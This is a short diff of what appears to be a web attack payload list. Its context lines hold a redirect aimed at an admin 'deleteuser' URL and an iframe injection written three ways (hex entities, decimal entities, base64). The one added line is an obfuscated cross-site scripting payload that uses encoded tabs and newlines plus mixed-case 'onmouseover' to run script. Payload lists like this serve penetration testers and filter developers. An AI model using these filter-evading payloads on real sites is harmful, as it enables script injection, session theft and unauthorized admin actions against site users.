@@ -537,3 +537,4 @@ Redirect 302 /vlab.jpg http://vulnerability-lab.com/admin.asp&deleteuser
 &#x3C;&#x69;&#x66;&#x72;&#x61;&#x6D;&#x65;&#x20;&#x73;&#x72;&#x63;&#x3D;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x74;&#x65;&#x73;&#x74;&#x2E;&#x64;&#x65;&#x3E;
 &#60&#105&#102&#114&#97&#109&#101&#32&#115&#114&#99&#61&#104&#116&#116&#112&#58&#47&#47&#116&#101&#115&#116&#46&#100&#101&#62
 PGlmcmFtZSBzcmM9aHR0cDovL3Rlc3QuZGU+
+<A%09onmOuSeoVER%0a=%0aa=alert,(document.domain)>xss
